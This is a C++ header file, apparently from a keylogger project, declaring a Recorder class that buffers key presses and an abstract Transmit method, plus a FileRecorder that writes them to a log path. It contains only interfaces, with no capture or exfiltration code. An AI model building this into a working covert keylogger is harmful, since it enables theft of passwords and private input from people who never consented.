#ifndef RECORDER_H_
#define RECORDER_H_

#include <filesystem>
#include <vector>

namespace keylogger {

class Recorder {
 public:
  Recorder() = delete;
  explicit Recorder(int key_limit);
  virtual ~Recorder() = default;
  Recorder(const Recorder&) = default;
  Recorder& operator=(const Recorder&) = default;
  Recorder(Recorder&&) = default;
  Recorder& operator=(Recorder&&) = default;

  void BufferKeyPress(char character);
  virtual void Transmit() = 0;

 protected:
  using CharList = std::vector<char>;

  int num_keys_;
  CharList keys_;
};

class FileRecorder : public Recorder {
 public:
  using FilePath = std::filesystem::path;

  FileRecorder() = delete;
  [[nodiscard]] FileRecorder(int key_limit, const FilePath& log_path);
  FileRecorder(const FileRecorder&) = default;
  FileRecorder& operator=(const FileRecorder&) = default;
  FileRecorder(FileRecorder&&) = default;
  FileRecorder& operator=(FileRecorder&&) = default;

  void Transmit() final;

 private:
  FilePath log_path_;
};

}  // namespace keylogger

#endif
